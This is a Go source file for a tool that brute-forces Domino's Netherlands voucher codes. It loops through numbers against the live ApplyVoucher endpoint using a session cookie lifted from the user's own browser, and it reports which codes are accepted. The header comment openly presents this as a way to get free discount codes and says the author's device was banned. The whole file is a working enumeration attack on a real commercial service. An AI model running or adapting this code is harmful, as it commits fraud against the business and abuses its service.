package main

import (
	"os"
	"fmt"
	"net/http"
	"io/ioutil"
	"encoding/json"
	"time"
	"strings"
	"strconv"
)

/* Using the Pizza-Voucher-Explorer(Netherlands).
 *
 * There are never any fucking codes when you need them. I've had enough. 
 * From now on, the Dominos-Pizza-Cracker™ will do the job of finding 
 * me those juicy dominos codes automatically. 
 *
 * To use this tool, you're going to need to know
 * 1) The city you reside in (shouldn't be hard).
 * 2) The number of the Dominos store you want to order from.
 * 3) The ASP.Net Session ID of an open connection you have to Dominos.
 *
 * Number 3 is the most confusing to explain. You basically need to open
 * a browser, navigate to a dominos store session, open the web-developer,
 * and then check the outgoing network requests when you submit a voucher.
 * What you want to do is visit the Cookies of the request. In it you can
 * find the ASP.NET_SessionId. That will be your session. The store number
 * and city are also listed in the cookies. 
 *
 * NOTE: You may get your device banned from accessing dominos-store (I did).
*/

// Type describing the response to a code inquiry.
type Code struct {
	Url 				string
	Messages 			[]string
	ResponseMessages 	string
}

// Return true if the code might be valid (no error message).
func isValid (c Code) bool {
	return len(c.Messages) == 0
}

// Returns a cookie for the request.
func getCookie (sessionID, storeName, storeNumber string) string {
	session := fmt.Sprintf("ASP.NET_SessionId=%s;", sessionID)
	name 	:= fmt.Sprintf("StoreName=%s;", storeName)
	number 	:= fmt.Sprintf("StoreNumber=%s;", storeNumber)
	return session + name + number //+ tipmix + arra
}

// Return the GET request URL for a given voucher number. Padding is inserted.
func getVoucherURL (v int64) string {
	voucher := fmt.Sprintf("%d", v)
	url 	:= "https://bestellen.dominos.nl/estore/nl/Basket/ApplyVoucher?voucherCode="
	return fmt.Sprintf("%s%s", url, voucher)
}

// Queries dominos for valid pizza-codes (see header)
func main () {
	var c Code;
	client := &http.Client{}

	// Example: ./dominos Rotterdam 30782 99999 tgpl1p41rj3bbqwlcrdwmlnw
	if (len(os.Args) != 5) {
		fmt.Printf("usage: %s <StoreName> <StoreNumber> <Starting-Value> <Session-ID>\n", os.Args[0])
		return
	}

	cookie := getCookie(os.Args[4], os.Args[1], os.Args[2])
	limit, err := strconv.ParseInt(os.Args[3], 10, 32)

	if err != nil {
		fmt.Printf("Couldn't convert %s to an integer!\n", os.Args[3])
		return
	}

	for v := limit; v > 0; v-- {
		req, _ := http.NewRequest("POST", getVoucherURL(v), nil)
		req.Header.Set("Cookie", cookie)

		res, _ := client.Do(req)
		bodyBytes, _ := ioutil.ReadAll(res.Body)
		err = json.Unmarshal(bodyBytes, &c)
    	
		if (err != nil) {
			fmt.Printf("%d: Bad Response -> Will try again!\n", v)
			v += 1;
		} else {
			if (isValid(c) == true) {
				fmt.Printf("%d: Y\n", v);
			} else {
				if (strings.Contains(c.Messages[0], "expired") == true) {
					fmt.Printf("Session ID needs to be refreshed!\n")
					break
				}
				fmt.Printf("%d: N\n", v);
			}
		}

		time.Sleep(500 * time.Millisecond)
	}
}